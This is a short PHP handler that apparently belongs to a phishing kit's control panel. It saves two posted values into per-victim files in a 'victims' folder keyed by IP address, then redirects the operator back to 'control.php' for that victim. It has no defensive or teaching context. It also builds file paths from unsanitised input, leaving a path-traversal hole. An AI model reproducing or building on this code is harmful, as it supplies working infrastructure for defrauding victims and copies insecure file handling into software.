<?php

    include "./config.php";

	if (isset($_POST['number1'])) {
        $sp = fopen('../../../victims/'. $_POST['ip']."+" .'.txt', 'wb');
        fwrite($sp, $_POST['number1']);
        fclose($sp);
        $sp = fopen('../../../victims/'. $_POST['ip']."++" .'.txt', 'wb');
        fwrite($sp, $_POST['number2']);
        fclose($sp);
        header("location: ../../../control.php?ip=" . $_POST['ip']);
        exit();
    }

?>